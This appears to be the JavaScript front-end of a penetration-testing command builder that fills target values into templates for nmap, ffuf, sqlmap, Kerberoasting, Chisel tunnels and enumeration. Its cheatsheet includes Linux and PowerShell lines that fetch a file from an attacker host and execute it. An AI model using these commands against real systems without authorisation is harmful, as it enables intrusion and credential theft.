const STORE = {
  values: "pentestbench_values_v3",
  recipes: "pentestbench_recipes_v2",
  ws_log: "pentestbench_ws_log_v1",
  ws_check: "pentestbench_ws_check_v1",
  ws_creds: "pentestbench_ws_creds_v1"
};

const els = {
  tabs: Array.from(document.querySelectorAll(".tab")),
  views: {
    commands: document.getElementById("view-commands"),
    workspace: document.getElementById("view-workspace"),
    cheatsheet: document.getElementById("view-cheatsheet")
  },

  profile: document.getElementById("profile"),

  ip: document.getElementById("ip"),
  port: document.getElementById("port"),
  url: document.getElementById("url"),
  domain: document.getElementById("domain"),
  user: document.getElementById("user"),
  pass: document.getElementById("pass"),
  wordlist: document.getElementById("wordlist"),
  hashfile: document.getElementById("hashfile"),
  lhost: document.getElementById("lhost"),
  lport: document.getElementById("lport"),
  iface: document.getElementById("iface"),
  proxy: document.getElementById("proxy"),

  cmdSearch: document.getElementById("cmdSearch"),
  btnClearSearch: document.getElementById("btnClearSearch"),
  commandsContainer: document.getElementById("commandsContainer"),
  quickTags: document.getElementById("quickTags"),

  btnToggleAll: document.getElementById("btnToggleAll"),
  btnResetAll: document.getElementById("btnResetAll"),
  btnCopyAll: document.getElementById("btnCopyAll"),

  btnExport: document.getElementById("btnExport"),
  btnImport: document.getElementById("btnImport"),
  fileImport: document.getElementById("fileImport"),

  wsLog: document.getElementById("wsLog"),
  wsChecklist: document.getElementById("wsChecklist"),
  wsCreds: document.getElementById("wsCreds"),
  btnWsInsertTs: document.getElementById("btnWsInsertTs"),
  btnWsCopyMd: document.getElementById("btnWsCopyMd"),
  btnWsExport: document.getElementById("btnWsExport"),
  btnWsClear: document.getElementById("btnWsClear"),

  cheatsContainer: document.getElementById("cheatsContainer"),
  btnCheatCopyAll: document.getElementById("btnCheatCopyAll"),

  toast: document.getElementById("toast")
};

function loadJSON(key, fallback) {
  try {
    const raw = localStorage.getItem(key);
    return raw ? JSON.parse(raw) : fallback;
  } catch {
    return fallback;
  }
}
function saveJSON(key, value) {
  localStorage.setItem(key, JSON.stringify(value));
}

function toast(msg) {
  els.toast.textContent = msg;
  els.toast.classList.add("show");
  window.clearTimeout(toast._t);
  toast._t = window.setTimeout(() => els.toast.classList.remove("show"), 1200);
}

async function copy(text) {
  try {
    await navigator.clipboard.writeText(text);
    toast("Copiado.");
    return true;
  } catch {
    toast("Falha ao copiar.");
    return false;
  }
}

function escapeHtml(s) {
  return String(s ?? "")
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll("\"", "&quot;")
    .replaceAll("'", "&#39;");
}

function getValues() {
  return {
    ip: els.ip.value.trim(),
    port: els.port.value.trim(),
    url: els.url.value.trim(),
    domain: els.domain.value.trim(),
    user: els.user.value.trim(),
    pass: els.pass.value.trim(),
    wordlist: els.wordlist.value.trim(),
    hashfile: els.hashfile.value.trim(),
    lhost: els.lhost.value.trim(),
    lport: els.lport.value.trim(),
    iface: els.iface.value.trim(),
    proxy: els.proxy.value.trim(),
    profile: els.profile.value
  };
}

function applyValues(v) {
  els.ip.value = v.ip ?? els.ip.value ?? "10.10.10.10";
  els.port.value = v.port ?? els.port.value ?? "443";
  els.url.value = v.url ?? els.url.value ?? "";
  els.domain.value = v.domain ?? els.domain.value ?? "corp.local";
  els.user.value = v.user ?? els.user.value ?? "administrator";
  els.pass.value = v.pass ?? els.pass.value ?? "Password123!";
  els.wordlist.value = v.wordlist ?? els.wordlist.value ?? "/usr/share/wordlists/rockyou.txt";
  els.hashfile.value = v.hashfile ?? els.hashfile.value ?? "/tmp/hashes.txt";
  els.lhost.value = v.lhost ?? els.lhost.value ?? "10.10.14.5";
  els.lport.value = v.lport ?? els.lport.value ?? "4444";
  els.iface.value = v.iface ?? els.iface.value ?? "tun0";
  els.proxy.value = v.proxy ?? els.proxy.value ?? "socks5://127.0.0.1:1080";
  els.profile.value = v.profile ?? els.profile.value ?? "all";
}

function normalizeUrl(values) {
  if (values.url) return values.url;
  const host = values.ip || "";
  const port = values.port || "";
  if (!host) return "";
  if (!port || port === "80") return `http://${host}`;
  if (port === "443") return `https://${host}`;
  return `http://${host}:${port}`;
}

function computeDerived(values) {
  const url = normalizeUrl(values);
  return { ...values, url };
}

function renderCmdPlain(template, values) {
  return template.replace(/\{(\w+)\}/g, (_, k) => values[k] ?? "");
}

function renderCmdHighlighted(template, values) {
  const out = template.replace(/\{(\w+)\}/g, (_, k) => {
    const v = values[k] ?? "";
    return `<span class="ph" title="${escapeHtml(k)}">${escapeHtml(v)}</span>`;
  });
  return escapeHtml(out).replaceAll("&lt;span class=&quot;ph&quot;", "<span class=\"ph\"")
                        .replaceAll("&lt;/span&gt;", "</span>")
                        .replaceAll("&gt;", ">")
                        .replaceAll("&quot;", "\"")
                        .replaceAll("&#39;", "'");
}

/*
  Nota: o escapeHtml acima protege os valores.
  Em seguida, reabrimos apenas as tags span geradas por n√≥s.
*/
function renderCmdHighlightedSafe(template, values) {
  const parts = [];
  let last = 0;
  const re = /\{(\w+)\}/g;
  let m;
  while ((m = re.exec(template)) !== null) {
    parts.push(escapeHtml(template.slice(last, m.index)));
    const key = m[1];
    const val = values[key] ?? "";
    parts.push(`<span class="ph" title="${escapeHtml(key)}">${escapeHtml(val)}</span>`);
    last = m.index + m[0].length;
  }
  parts.push(escapeHtml(template.slice(last)));
  return parts.join("");
}

const DEFAULT_RECIPES = [
  {
    category: "Recon",
    icon: "üß≠",
    profile: ["oscp", "web", "ad"],
    items: [
      { name: "Nmap full TCP", tag: ["nmap","recon"], cmd: "nmap -p- -T4 {ip}" },
      { name: "Nmap scripts and versions", tag: ["nmap","recon"], cmd: "nmap -sC -sV -p {port} {ip}" },
      { name: "Nmap UDP top", tag: ["nmap","recon"], cmd: "sudo nmap -sU --top-ports 200 {ip}" },
      { name: "Service banner quick", tag: ["recon"], cmd: "nc -nv {ip} {port}" }
    ]
  },
  {
    category: "Web",
    icon: "üåê",
    profile: ["oscp", "web"],
    items: [
      { name: "FFUF dir", tag: ["ffuf","web","fuzz"], cmd: "ffuf -u {url}/FUZZ -w {wordlist} -t 80 -fc 404" },
      { name: "Gobuster dir", tag: ["gobuster","web"], cmd: "gobuster dir -u {url}/ -w {wordlist} -t 50 -x php,asp,aspx,txt,js" },
      { name: "Nikto", tag: ["nikto","web"], cmd: "nikto -h {url}" },
      { name: "Nuclei", tag: ["nuclei","web"], cmd: "nuclei -u {url} -severity low,medium,high,critical" },
      { name: "SQLMap basic", tag: ["sqlmap","web"], cmd: "sqlmap -u \"{url}/?id=1\" --batch --risk=2 --level=3" }
    ]
  },
  {
    category: "SMB and Windows Services",
    icon: "ü™ü",
    profile: ["oscp", "ad"],
    items: [
      { name: "SMB shares anon", tag: ["smb","enum"], cmd: "smbclient -L //{ip}/ -N" },
      { name: "CME shares", tag: ["smb","cme","enum"], cmd: "crackmapexec smb {ip} -u {user} -p \"{pass}\" --shares" },
      { name: "RPC client", tag: ["rpc","enum"], cmd: "rpcclient -U \"{user}%{pass}\" {ip}" },
      { name: "LDAP namingContexts", tag: ["ldap","enum"], cmd: "ldapsearch -x -H ldap://{ip} -s base -b \"\" namingContexts" }
    ]
  },
  {
    category: "Active Directory",
    icon: "üß©",
    profile: ["ad"],
    items: [
      { name: "BloodHound Python", tag: ["ad","bloodhound"], cmd: "bloodhound-python -d {domain} -u {user} -p \"{pass}\" -ns {ip} -c All" },
      { name: "Kerbrute userenum", tag: ["ad","kerbrute"], cmd: "kerbrute userenum -d {domain} --dc {ip} {wordlist}" },
      { name: "GetNPUsers", tag: ["ad","impacket"], cmd: "GetNPUsers.py {domain}/ -dc-ip {ip} -usersfile {wordlist} -no-pass" },
      { name: "GetUserSPNs", tag: ["ad","impacket"], cmd: "GetUserSPNs.py {domain}/{user}:\"{pass}\" -dc-ip {ip} -request" }
    ]
  },
  {
    category: "File Transfer",
    icon: "üì¶",
    profile: ["oscp", "web", "ad"],
    items: [
      { name: "Python HTTP server", tag: ["transfer"], cmd: "python3 -m http.server {lport} --bind 0.0.0.0" },
      { name: "curl", tag: ["transfer"], cmd: "curl -L http://{lhost}:{lport}/FILE -o /tmp/FILE" },
      { name: "wget", tag: ["transfer"], cmd: "wget http://{lhost}:{lport}/FILE -O /tmp/FILE" }
    ]
  },
  {
    category: "Tunneling and Pivoting",
    icon: "üß∑",
    profile: ["oscp", "ad"],
    items: [
      { name: "SSH local forward", tag: ["pivot","ssh"], cmd: "ssh -L 127.0.0.1:8888:{ip}:{port} {user}@{ip}" },
      { name: "SSH dynamic SOCKS", tag: ["pivot","ssh"], cmd: "ssh -D 127.0.0.1:1080 {user}@{ip}" },
      { name: "Chisel server", tag: ["pivot","chisel"], cmd: "chisel server --reverse -p 8000" },
      { name: "Chisel client socks", tag: ["pivot","chisel"], cmd: "chisel client {ip}:8000 R:socks" },
      { name: "Proxychains example", tag: ["proxy"], cmd: "proxychains -q nmap -sT -Pn -p {port} {ip}" }
    ]
  }
];

function getRecipes() {
  const stored = loadJSON(STORE.recipes, null);
  return Array.isArray(stored) && stored.length ? stored : DEFAULT_RECIPES;
}
function setRecipes(recipes) {
  saveJSON(STORE.recipes, recipes);
}

let activeTag = "";
let allExpanded = false;

function buildTagSet(recipes) {
  const tags = new Set();
  recipes.forEach(g => g.items.forEach(it => (it.tag || []).forEach(t => tags.add(t))));
  return Array.from(tags).sort((a,b) => a.localeCompare(b));
}

function renderTagChips(tags) {
  els.quickTags.innerHTML = "";

  const mk = (label, isActive, onClick) => {
    const b = document.createElement("button");
    b.className = `chip ${isActive ? "active" : ""}`;
    b.textContent = label;
    b.addEventListener("click", onClick);
    return b;
  };

  els.quickTags.appendChild(mk("all", !activeTag, () => {
    activeTag = "";
    renderCommands();
  }));

  tags.slice(0, 18).forEach(t => {
    els.quickTags.appendChild(mk(t, activeTag === t, () => {
      activeTag = (activeTag === t) ? "" : t;
      renderCommands();
    }));
  });
}

function sectionEl(group, values, query, profile, tag) {
  const section = document.createElement("div");
  section.className = "section";
  section.dataset.open = "false";

  const head = document.createElement("div");
  head.className = "sectionHead";

  const left = document.createElement("div");
  left.className = "sectionTitle";
  left.innerHTML = `<span>${group.icon || "‚Ä¢"}</span><span>${escapeHtml(group.category)}</span>`;

  const badge = document.createElement("span");
  badge.className = "badge";

  const chev = document.createElement("span");
  chev.className = "chev";
  chev.textContent = "‚ñæ";

  head.appendChild(left);
  head.appendChild(badge);
  head.appendChild(chev);

  const body = document.createElement("div");
  body.className = "sectionBody";

  const groupAllowed = !group.profile || group.profile.includes(profile) || profile === "all";

  const items = (group.items || [])
    .map(it => {
      const cmdPlain = renderCmdPlain(it.cmd, values);
      const cmdHtml = renderCmdHighlightedSafe(it.cmd, values);
      return { ...it, cmdPlain, cmdHtml };
    })
    .filter(it => {
      if (!groupAllowed) return false;

      if (tag) {
        const tags = it.tag || [];
        if (!tags.includes(tag)) return false;
      }

      if (!query) return true;
      const q = query.toLowerCase();
      const tags = (it.tag || []).join(" ").toLowerCase();
      return (
        (it.name || "").toLowerCase().includes(q) ||
        tags.includes(q) ||
        (it.cmdPlain || "").toLowerCase().includes(q) ||
        (group.category || "").toLowerCase().includes(q)
      );
    });

  badge.textContent = `${items.length} commands`;

  if (items.length === 0) {
    section.dataset.open = "false";
    body.style.display = "none";
  } else {
    items.forEach(it => {
      const item = document.createElement("div");
      item.className = "item";

      const top = document.createElement("div");
      top.className = "itemTop";

      const name = document.createElement("div");
      name.className = "itemName";
      name.textContent = it.name;

      const tagEl = document.createElement("span");
      tagEl.className = "tag";
      tagEl.textContent = (it.tag && it.tag[0]) ? it.tag[0] : "cmd";
      name.appendChild(tagEl);

      const btn = document.createElement("button");
      btn.className = "btn";
      btn.textContent = "Copy";
      btn.addEventListener("click", () => copy(it.cmdPlain));

      top.appendChild(name);
      top.appendChild(btn);

      const code = document.createElement("div");
      code.className = "code";
      code.innerHTML = it.cmdHtml;

      item.appendChild(top);
      item.appendChild(code);
      body.appendChild(item);
    });
  }

  head.addEventListener("click", () => {
    const isOpen = section.dataset.open === "true";
    section.dataset.open = (!isOpen).toString();
    body.style.display = isOpen ? "none" : "grid";
  });

  section.appendChild(head);
  section.appendChild(body);
  return section;
}

function renderCommands() {
  const base = getValues();
  const values = computeDerived(base);

  if (!els.url.value.trim()) {
    els.url.value = values.url;
  }

  saveJSON(STORE.values, values);

  const q = (els.cmdSearch.value || "").trim();
  const profile = values.profile || "all";
  const recipes = getRecipes();

  els.commandsContainer.innerHTML = "";

  recipes.forEach(group => {
    const sec = sectionEl(group, values, q, profile, activeTag);
    els.commandsContainer.appendChild(sec);
  });

  const sections = Array.from(document.querySelectorAll("#commandsContainer .section"));
  const anyItems = els.commandsContainer.querySelectorAll(".item").length > 0;

  if (anyItems && (q || activeTag)) {
    sections.forEach(sec => {
      const body = sec.querySelector(".sectionBody");
      const hasItems = sec.querySelectorAll(".item").length > 0;
      sec.dataset.open = hasItems ? "true" : "false";
      body.style.display = hasItems ? "grid" : "none";
    });
    allExpanded = true;
    setToggleAllLabel();
    return;
  }

  allExpanded = false;
  setToggleAllLabel();
  sections.forEach(sec => {
    const body = sec.querySelector(".sectionBody");
    sec.dataset.open = "false";
    body.style.display = "none";
  });
}

function expandAll(toggleOpen) {
  const sections = Array.from(document.querySelectorAll(".section"));
  sections.forEach(sec => {
    const body = sec.querySelector(".sectionBody");
    sec.dataset.open = toggleOpen ? "true" : "false";
    body.style.display = toggleOpen ? "grid" : "none";
  });
  allExpanded = toggleOpen;
  setToggleAllLabel();
}

function setToggleAllLabel() {
  els.btnToggleAll.textContent = allExpanded ? "Collapse sections" : "Expand sections";
}

function setTab(tab) {
  els.tabs.forEach(b => {
    const active = b.dataset.tab === tab;
    b.classList.toggle("active", active);
    b.setAttribute("aria-selected", active ? "true" : "false");
  });

  Object.entries(els.views).forEach(([k, v]) => {
    v.classList.toggle("active", k === tab);
  });
}

function resetAll() {
  applyValues({
    ip:"10.10.10.10",
    port:"443",
    url:"",
    domain:"corp.local",
    user:"administrator",
    pass:"Password123!",
    wordlist:"/usr/share/wordlists/rockyou.txt",
    hashfile:"/tmp/hashes.txt",
    lhost:"10.10.14.5",
    lport:"4444",
    iface:"tun0",
    proxy:"socks5://127.0.0.1:1080",
    profile:"all"
  });

  saveJSON(STORE.values, getValues());
  activeTag = "";
  els.cmdSearch.value = "";
  renderAll();
  toast("Resetado.");
}

function exportAll() {
  const payload = {
    version: "pentestbench_export_v3",
    exportedAt: new Date().toISOString(),
    values: getValues(),
    recipes: getRecipes(),
    workspace: {
      log: els.wsLog.value,
      checklist: els.wsChecklist.value,
      creds: els.wsCreds.value
    }
  };

  const blob = new Blob([JSON.stringify(payload, null, 2)], { type: "application/json;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = "pentestbench_export.json";
  a.click();
  URL.revokeObjectURL(url);
  toast("Exportado.");
}

async function importAll(file) {
  try {
    const text = await file.text();
    const data = JSON.parse(text);

    if (!data || typeof data !== "object") throw new Error("invalid");

    if (data.values) applyValues(data.values);
    if (Array.isArray(data.recipes)) setRecipes(data.recipes);

    if (data.workspace) {
      els.wsLog.value = data.workspace.log ?? els.wsLog.value;
      els.wsChecklist.value = data.workspace.checklist ?? els.wsChecklist.value;
      els.wsCreds.value = data.workspace.creds ?? els.wsCreds.value;
      persistWorkspace();
    }

    saveJSON(STORE.values, getValues());
    renderAll();
    toast("Importado.");
  } catch {
    toast("Import inv√°lido.");
  }
}

function persistWorkspace() {
  localStorage.setItem(STORE.ws_log, els.wsLog.value);
  localStorage.setItem(STORE.ws_check, els.wsChecklist.value);
  localStorage.setItem(STORE.ws_creds, els.wsCreds.value);
}

function nowStamp() {
  const d = new Date();
  const pad = (n) => String(n).padStart(2, "0");
  const yyyy = d.getFullYear();
  const mm = pad(d.getMonth() + 1);
  const dd = pad(d.getDate());
  const hh = pad(d.getHours());
  const mi = pad(d.getMinutes());
  const ss = pad(d.getSeconds());
  return `${yyyy}-${mm}-${dd} ${hh}:${mi}:${ss}`;
}

/* Cheatsheet */

const CHEATS = [
  {
    category: "Linux",
    icon: "üêß",
    items: [
      { title: "Enum b√°sico", body: [
        "id",
        "whoami",
        "uname -a",
        "cat /etc/os-release",
        "ip a",
        "ss -tulpn",
        "sudo -l"
      ]},
      { title: "Privesc quick hits", body: [
        "find / -perm -4000 -type f 2>/dev/null",
        "getcap -r / 2>/dev/null",
        "ps aux",
        "cat /etc/crontab",
        "ls -la /etc/cron.*"
      ]},
      { title: "Transfer e execu√ß√£o", body: [
        "python3 -m http.server {lport} --bind 0.0.0.0",
        "curl -L http://{lhost}:{lport}/FILE -o /tmp/FILE",
        "chmod +x /tmp/FILE && /tmp/FILE"
      ]}
    ]
  },
  {
    category: "Windows",
    icon: "ü™ü",
    items: [
      { title: "Enum b√°sico", body: [
        "whoami",
        "systeminfo",
        "ipconfig /all",
        "net user",
        "net localgroup administrators",
        "tasklist /v"
      ]},
      { title: "Privesc e posture", body: [
        "whoami /priv",
        "whoami /groups",
        "sc query",
        "wmic service get name,displayname,pathname,startmode",
        "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
      ]},
      { title: "Transfer e execu√ß√£o", body: [
        "powershell -c \"iwr http://{lhost}:{lport}/FILE -OutFile $env:TEMP\\FILE\"",
        "powershell -c \"Start-Process $env:TEMP\\FILE\""
      ]}
    ]
  },
  {
    category: "Active Directory",
    icon: "üß©",
    items: [
      { title: "Coleta", body: [
        "bloodhound-python -d {domain} -u {user} -p \"{pass}\" -ns {ip} -c All",
        "crackmapexec smb {ip} -u {user} -p \"{pass}\" --shares"
      ]},
      { title: "Kerberos", body: [
        "GetNPUsers.py {domain}/ -dc-ip {ip} -usersfile {wordlist} -no-pass",
        "GetUserSPNs.py {domain}/{user}:\"{pass}\" -dc-ip {ip} -request"
      ]},
      { title: "LDAP quick", body: [
        "ldapsearch -x -H ldap://{ip} -s base -b \"\" namingContexts",
        "ldapsearch -x -H ldap://{ip} -b \"DC=corp,DC=local\" \"(objectClass=user)\" sAMAccountName"
      ]}
    ]
  }
];

function renderCheatsheet() {
  const base = getValues();
  const v = computeDerived(base);

  els.cheatsContainer.innerHTML = "";

  CHEATS.forEach(group => {
    const section = document.createElement("div");
    section.className = "section";
    section.dataset.open = "false";

    const head = document.createElement("div");
    head.className = "sectionHead";

    const left = document.createElement("div");
    left.className = "sectionTitle";
    left.innerHTML = `<span>${group.icon}</span><span>${escapeHtml(group.category)}</span>`;

    const badge = document.createElement("span");
    badge.className = "badge";
    badge.textContent = `${group.items.length} blocks`;

    const chev = document.createElement("span");
    chev.className = "chev";
    chev.textContent = "‚ñæ";

    head.appendChild(left);
    head.appendChild(badge);
    head.appendChild(chev);

    const body = document.createElement("div");
    body.className = "sectionBody";
    body.style.display = "none";

    group.items.forEach(block => {
      const item = document.createElement("div");
      item.className = "item";

      const top = document.createElement("div");
      top.className = "itemTop";

      const name = document.createElement("div");
      name.className = "itemName";
      name.textContent = block.title;

      const tag = document.createElement("span");
      tag.className = "tag";
      tag.textContent = group.category;

      name.appendChild(tag);

      const btn = document.createElement("button");
      btn.className = "btn";
      btn.textContent = "Copy";
      btn.addEventListener("click", () => {
        const text = block.body.map(line => renderCmdPlain(line, v)).join("\n");
        copy(text);
      });

      top.appendChild(name);
      top.appendChild(btn);

      const code = document.createElement("div");
      code.className = "code";

      const html = block.body
        .map(line => renderCmdHighlightedSafe(line, v))
        .join("\n");

      code.innerHTML = html;

      item.appendChild(top);
      item.appendChild(code);
      body.appendChild(item);
    });

    head.addEventListener("click", () => {
      const isOpen = section.dataset.open === "true";
      section.dataset.open = (!isOpen).toString();
      body.style.display = isOpen ? "none" : "grid";
    });

    section.appendChild(head);
    section.appendChild(body);

    els.cheatsContainer.appendChild(section);
  });
}

async function copyCheatAll() {
  const base = getValues();
  const v = computeDerived(base);

  const out = [];
  CHEATS.forEach(group => {
    out.push(`# ${group.category}`);
    out.push("");
    group.items.forEach(block => {
      out.push(`## ${block.title}`);
      out.push(block.body.map(line => renderCmdPlain(line, v)).join("\n"));
      out.push("");
    });
  });

  await copy(out.join("\n"));
}

function workspaceToMarkdown() {
  const log = els.wsLog.value || "";
  const checklist = els.wsChecklist.value || "";
  const creds = els.wsCreds.value || "";

  return [
    "# Workspace",
    "",
    "## Engagement Log",
    "```",
    log.trimEnd(),
    "```",
    "",
    "## Checklist",
    "```",
    checklist.trimEnd(),
    "```",
    "",
    "## Creds",
    "```",
    creds.trimEnd(),
    "```",
    ""
  ].join("\n");
}

function exportWorkspace() {
  const md = workspaceToMarkdown();
  const blob = new Blob([md], { type: "text/markdown;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = "pentestbench_workspace.md";
  a.click();
  URL.revokeObjectURL(url);
  toast("Exportado.");
}

function renderAll() {
  const tags = buildTagSet(getRecipes());
  renderTagChips(tags);
  renderCommands();
  renderCheatsheet();
}

/* Bind */

function bind() {
  els.tabs.forEach(b => {
    b.addEventListener("click", () => setTab(b.dataset.tab));
  });

  [
    els.profile, els.ip, els.port, els.url, els.domain, els.user, els.pass,
    els.wordlist, els.hashfile, els.lhost, els.lport, els.iface, els.proxy
  ].forEach(el => {
    el.addEventListener("input", renderAll);
    el.addEventListener("change", renderAll);
  });

  els.btnClearSearch.addEventListener("click", () => {
    els.cmdSearch.value = "";
    renderCommands();
  });

  els.cmdSearch.addEventListener("input", () => renderCommands());

  els.btnResetAll.addEventListener("click", resetAll);

  els.btnToggleAll.addEventListener("click", () => {
    expandAll(!allExpanded);
  });

  els.btnCopyAll.addEventListener("click", async () => {
    const base = getValues();
    const v = computeDerived(base);
    const profile = v.profile || "all";
    const q = (els.cmdSearch.value || "").trim().toLowerCase();
    const recipes = getRecipes();

    const lines = [];
    recipes.forEach(g => {
      const allowed = !g.profile || g.profile.includes(profile) || profile === "all";
      if (!allowed) return;

      lines.push(`## ${g.category}`);
      (g.items || []).forEach(it => {
        const tags = it.tag || [];
        if (activeTag && !tags.includes(activeTag)) return;

        const cmd = renderCmdPlain(it.cmd, v);
        if (q) {
          const hay = `${it.name} ${tags.join(" ")} ${cmd} ${g.category}`.toLowerCase();
          if (!hay.includes(q)) return;
        }
        lines.push(cmd);
      });
      lines.push("");
    });

    await copy(lines.join("\n"));
  });

  els.btnExport.addEventListener("click", exportAll);
  els.btnImport.addEventListener("click", () => els.fileImport.click());

  els.fileImport.addEventListener("change", async () => {
    const f = els.fileImport.files && els.fileImport.files[0];
    els.fileImport.value = "";
    if (!f) return;
    await importAll(f);
  });

  els.wsLog.addEventListener("input", () => { persistWorkspace(); });
  els.wsChecklist.addEventListener("input", () => { persistWorkspace(); });
  els.wsCreds.addEventListener("input", () => { persistWorkspace(); });

  els.btnWsInsertTs.addEventListener("click", () => {
    const stamp = `[${nowStamp()}] `;
    const cur = els.wsLog.value || "";
    els.wsLog.value = cur ? `${cur.trimEnd()}\n${stamp}` : stamp;
    persistWorkspace();
    toast("Timestamp inserido.");
  });

  els.btnWsCopyMd.addEventListener("click", async () => {
    await copy(workspaceToMarkdown());
  });

  els.btnWsExport.addEventListener("click", exportWorkspace);

  els.btnWsClear.addEventListener("click", () => {
    els.wsLog.value = "";
    els.wsChecklist.value = "";
    els.wsCreds.value = "";
    persistWorkspace();
    toast("Workspace limpo.");
  });

  els.btnCheatCopyAll.addEventListener("click", copyCheatAll);
}

(function init() {
  const saved = loadJSON(STORE.values, null);
  if (saved) applyValues(saved);

  const storedRecipes = loadJSON(STORE.recipes, null);
  if (!Array.isArray(storedRecipes) || !storedRecipes.length) {
    setRecipes(DEFAULT_RECIPES);
  }

  els.wsLog.value = localStorage.getItem(STORE.ws_log) || "";
  els.wsChecklist.value = localStorage.getItem(STORE.ws_check) || "";
  els.wsCreds.value = localStorage.getItem(STORE.ws_creds) || "";

  bind();
  renderAll();
  setTab("commands");

  allExpanded = false;
  setToggleAllLabel();
})();
